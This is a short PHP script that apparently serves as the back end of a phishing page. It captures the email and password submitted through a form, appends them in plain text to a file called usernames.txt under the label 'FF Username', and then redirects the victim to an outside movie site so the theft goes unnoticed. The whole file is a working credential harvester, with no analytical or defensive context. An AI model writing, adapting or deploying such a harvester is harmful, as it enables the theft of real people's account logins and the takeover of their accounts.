<?php

file_put_contents("usernames.txt", "FF Username: " . $_POST['email'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
header('Location: https://www.atozmovies.tech/');
exit();
?>